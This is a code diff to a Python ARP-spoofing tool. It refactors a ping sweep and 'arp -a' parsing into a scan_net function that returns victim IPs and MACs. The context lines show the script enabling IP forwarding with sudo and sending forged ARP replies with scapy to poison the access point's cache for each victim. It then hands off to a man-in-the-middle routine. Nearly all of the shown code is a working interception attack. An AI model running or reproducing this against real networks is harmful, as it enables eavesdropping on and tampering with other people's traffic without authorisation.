@@ -41,6 +41,28 @@ def scan_net(ip):
 		subprocess.run("ping -c 5 {} > /dev/null 2>&1 &".format(try_ip),shell=True)
 	time.sleep(2)
 
+	stream = os.popen('arp -a | grep -v incomplete')
+
+	vip = []
+	vmac = []
+
+	lines = stream.readline()
+
+	while lines:
+		line = lines.split()
+		line[1] = re.sub('[()]', '', line[1])
+		vip.append(line[1])
+		vmac.append(line[3])
+		lines = stream.readline()
+
+	for i in range(len(vip)):
+		print(vip[i] + "\t\t" + vmac[i])
+
+
+	print("\nscan network completed.")
+
+	return vip,vmac
+
 
 
 
@@ -48,21 +70,8 @@ def arp():
 	os.system("sudo sysctl -w net.ipv4.ip_forward="+str(1))
 	attacker_ip, attacker_mac = attacker()
 
-	scan_net(attacker_ip)
+	vip, vmac = scan_net(attacker_ip)
 
-	stream = os.popen('arp -a | grep -v incomplete')
-
-	vip = []
-	vmac = []
-
-	lines = stream.readline()
-	while lines:
-		line = lines.split()
-		line[1] = re.sub('[()]', '', line[1])
-		vip.append(line[1])
-		vmac.append(line[3])
-		lines = stream.readline()
-	
 	
 	ap_ip, ap_mac = ap(vip,vmac)
 	print(vip,vmac)
@@ -84,6 +93,7 @@ def arp():
 			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[v], hwdst=vmac[v], hwsrc=attacker_mac, op=2))
 			time.sleep(0.1)
 
+	print("arp spoffing completed.\n")
 	middle_man(attacker_ip)
 
 # spoof_vic_pkt = Ether(src=attacker_mac,dst=vic_mac)/ARP(psrc=ap_ip, pdst=vic_ip,hwsrc=attacker_mac, op=2)	
